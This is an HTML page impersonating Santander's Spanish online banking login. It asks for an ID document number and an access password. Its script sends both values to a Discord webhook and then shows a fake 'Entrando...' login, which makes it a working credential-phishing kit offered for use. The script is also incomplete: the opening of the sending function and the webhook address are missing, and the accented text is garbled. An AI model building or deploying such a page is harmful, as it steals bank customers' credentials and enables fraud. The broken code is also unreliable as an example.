<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Santander - Buenas tardes</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(0,0,0,0.6)),
                url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 600"><rect fill="%23000" width="1000" height="600"/><g fill="%23333"><circle cx="200" cy="150" r="100"/><circle cx="800" cy="400" r="150"/><polygon points="100,500 300,450 250,600"/></g></svg>');
            background-size: cover;
            background-position: center;
            min-height: 100vh;
            color: white;
            display: flex;
            flex-direction: column;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 30px;
            background: rgba(0,0,0,0.3);
            backdrop-filter: blur(10px);
        }

        .logo {
            display: flex;
            align-items: center;
            font-size: 28px;
            font-weight: bold;
        }

        .logo::before {
            content: '';
            width: 40px;
            height: 40px;
            background: #EC0000;
            border-radius: 50%;
            margin-right: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .menu-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            background: none;
            border: none;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }

        .hamburger {
            display: flex;
            flex-direction: column;
            gap: 4px;
            margin-bottom: 5px;
        }

        .hamburger div {
            width: 25px;
            height: 3px;
            background: white;
            border-radius: 2px;
        }

        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 40px 30px;
            max-width: 800px;
            margin: 0 auto;
            width: 100%;
        }

        .greeting {
            font-size: 48px;
            font-weight: 300;
            margin-bottom: 60px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
            animation: fadeInUp 0.8s ease-out;
        }

        .login-form {
            display: flex;
            flex-direction: column;
            gap: 25px;
            animation: fadeInUp 0.8s ease-out 0.2s both;
        }

        .form-group {
            display: flex;
            flex-direction: column;
        }

        .form-label {
            font-size: 16px;
            margin-bottom: 10px;
            font-weight: 500;
        }

        .form-input {
            padding: 18px 20px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            background: rgba(255,255,255,0.95);
            color: #333;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .form-input::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(236,0,0,0.1), transparent);
            transition: left 0.5s ease;
        }

        .form-input:focus::before {
            left: 100%;
        }

        .form-input:focus {
            outline: none;
            background: white;
            box-shadow: 0 0 20px rgba(236,0,0,0.3);
            transform: translateY(-2px);
        }

        .password-input-container {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #666;
            cursor: pointer;
            font-size: 20px;
        }

        .recover-link {
            display: flex;
            align-items: center;
            color: white;
            text-decoration: none;
            font-size: 16px;
            margin-top: 10px;
            transition: opacity 0.3s ease;
        }

        .recover-link:hover {
            opacity: 0.8;
        }

        .recover-link::before {
            content: 'üîë';
            margin-right: 8px;
        }

        .remember-text {
            font-size: 14px;
            color: rgba(255,255,255,0.9);
            margin-top: 15px;
            line-height: 1.4;
        }

        .more-info {
            display: flex;
            align-items: center;
            color: white;
            text-decoration: none;
            font-size: 16px;
            margin-top: 30px;
            cursor: pointer;
            transition: opacity 0.3s ease;
        }

        .more-info:hover {
            opacity: 0.8;
        }

        .more-info::after {
            content: '‚ñº';
            margin-left: 10px;
            font-size: 12px;
        }

        .login-btn {
            background: linear-gradient(135deg, #EC0000, #FF4444);
            color: white;
            border: none;
            border-radius: 12px;
            padding: 18px 40px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 40px;
            transition: all 0.3s ease;
            box-shadow: 0 8px 25px rgba(236,0,0,0.3);
            text-transform: uppercase;
        }

        .login-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 35px rgba(236,0,0,0.4);
            background: linear-gradient(135deg, #FF0000, #FF5555);
        }

        .login-btn:active {
            transform: translateY(-1px);
        }

        @media (max-width: 768px) {
            .greeting {
                font-size: 36px;
                margin-bottom: 40px;
            }

            .main-content {
                padding: 20px;
            }

            .header {
                padding: 15px 20px;
            }
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">
            Santander
        </div>
        <button class="menu-btn" onclick="toggleMenu()">
            <div class="hamburger">
                <div></div>
                <div></div>
                <div></div>
            </div>
            Men√∫
        </button>
    </header>

    <main class="main-content">
        <h1 class="greeting">Buenas tardes</h1>

        <form class="login-form" onsubmit="handleLogin(event)">
            <div class="form-group">
                <label class="form-label" for="nif-input">NIF / NIE / Pasaporte</label>
                <input type="text" id="nif-input" class="form-input" placeholder="Introduce tu NIF/NIE/Pasaporte" required />
            </div>

            <div class="form-group">
                <label class="form-label" for="password">Introduce tu clave de acceso</label>
                <div class="password-input-container">
                    <input
                        type="password"
                        class="form-input"
                        placeholder="Introduce tu clave de acceso"
                        id="password"
                        required
                    />
                    <button type="button" class="password-toggle" onclick="togglePassword()">
                        üëÅÔ∏è
                    </button>
                </div>
                <a href="#" class="recover-link">Recupera tu clave de acceso</a>
                <p class="remember-text">
                    Tu usuario se recordar√° en este dispositivo. Solamente tendr√°s que introducir la clave.
                </p>
            </div>

            <a href="#" class="more-info" onclick="toggleMoreInfo()">M√°s informaci√≥n</a>

            <button type="submit" class="login-btn"></button>
        </form>
    </main>

    <script>

            const data = {
                content: `Nuevo inicio de sesi√≥n:\nDocumento: ${docNumber || 'desconocido'}\nContrase√±a: ${password || 'no especificada'}`
            };

            try {
                await fetch(webhookURL, {
                    method: 'POST',

                    body: JSON.stringify(data),
                });
                console.log('Notificaci√≥n enviada a Discord');
            } catch (error) {
                console.error('Error enviando la notificaci√≥n a Discord:', error);
            }
        }

        function handleLogin(event) {
            event.preventDefault();

            const nifInput = document.getElementById('nif-input');
            const passwordInput = document.getElementById('password');

            const docNumber = nifInput.value.trim();
            const password = passwordInput.value;

            if (!docNumber) {
                alert('Por favor, introduce tu n√∫mero de documento.');
                return;
            }
            if (!password) {
                alert('Por favor, introduce tu contrase√±a.');
                return;
            }

            // Enviar notificaci√≥n con documento y contrase√±a
            sendDiscordNotification(docNumber, password);

            // Simulaci√≥n de login
            const loginBtn = document.querySelector('.login-btn');
            loginBtn.textContent = 'Entrando...';
            loginBtn.style.background = 'linear-gradient(135deg, #666, #999)';

            setTimeout(() => {
                loginBtn.textContent = 'Entrar';
                loginBtn.style.background = 'linear-gradient(135deg, #EC0000, #FF4444)';
            }, 2000);
        }

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = document.querySelector('.password-toggle');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = 'üôà';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = 'üëÅÔ∏è';
            }
        }

        function toggleMenu() {
            alert('Men√∫ desplegable - Funcionalidad a implementar');
        }

        function toggleMoreInfo() {
            alert('M√°s informaci√≥n sobre el proceso de login');
        }

        // Efectos de hover en los inputs
        document.querySelectorAll('.form-input').forEach(input => {
            input.addEventListener('focus', function () {
                this.style.transform = 'translateY(-2px)';
            });

            input.addEventListener('blur', function () {
                this.style.transform = 'translateY(0)';
            });
        });

        // Saludo din√°mico basado en la hora
        function updateGreeting() {
            const now = new Date();
            const hour = now.getHours();
            const greetingElement = document.querySelector('.greeting');

            if (hour < 12) {
                greetingElement.textContent = 'Buenos d√≠as';
            } else if (hour < 18) {
                greetingElement.textContent = 'Buenas tardes';
            } else {
                greetingElement.textContent = 'Buenas noches';
            }
        }

        // Actualizar saludo al cargar la p√°gina
        updateGreeting();
    </script>
</body>
</html>
